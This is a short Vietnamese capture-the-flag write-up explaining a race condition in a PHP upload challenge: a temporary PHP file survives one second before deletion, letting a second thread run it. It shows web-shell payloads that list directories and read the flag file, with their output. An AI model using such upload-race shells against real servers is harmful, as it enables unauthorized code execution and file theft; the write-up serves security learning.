# Solution


Đây là một dạng race condition.

```php
$filename = './tmp/' . md5($_SERVER['REMOTE_ADDR']) . '.php';
```

Ta nhận thấy file được ghi tạm thời ở `./tmp/md5($_SERVER['REMOTE_ADDR']).php`

và sẽ được xóa sau khi xử lí xong `unlink($filename);` nhưng điểm đáng chú ý là hàm `sleep(1);`. Sau 1s mới thực hiện xóa file => trong khoảng thời gian đó ta vẫn có thể access tới để thực thi php shell code.

Kịch bản: 1 thread dùng để upload shell, 1 thread dùng để access tới shell cụ thể xem ở `exp.py`

Payload: 

```php
print_r(scandir($_GET[0]));
```

Kết quả:

```php
Array
(
    [0] => .
    [1] => ..
    [2] => flag.php
    [3] => index.php
    [4] => php-fpm.sock
    [5] => source.php
    [6] => tmp
)
```

Payload:

```php
print_r(file_get_contents('/flag.php'));
```

Kết quả:

```php
<?php

$flag = 'WEBSEC{Try_it_yourself_dont_copy_and_paste}';
```